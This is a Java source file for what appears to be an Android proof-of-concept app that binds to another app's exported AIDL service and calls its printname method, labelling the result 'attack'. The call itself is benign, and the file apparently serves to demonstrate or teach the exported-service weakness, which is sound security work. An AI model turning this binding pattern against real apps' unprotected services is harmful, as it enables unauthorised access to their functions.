package com.poc.exported_service_2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    AidlInterface stub_interface;
    Button button;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (stub_interface == null) {
            Intent it = new Intent();
            it.setClassName("com.poc.exported_service_2", "com.poc.exported_service_2.Server_Service");
            bindService(it, connection, Context.BIND_AUTO_CREATE);
        }
        button = findViewById(R.id.button);

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    start();
                } catch (RemoteException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    public void start() throws RemoteException {
        String attack = stub_interface.printname("User", BuildConfig.APPLICATION_ID);
        Toast.makeText(getApplicationContext(), attack, Toast.LENGTH_SHORT).show();

    }

    protected ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            stub_interface = AidlInterface.Stub.asInterface(iBinder);
            Toast.makeText(getApplicationContext(), "Service Connected", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {

        }
    };
}
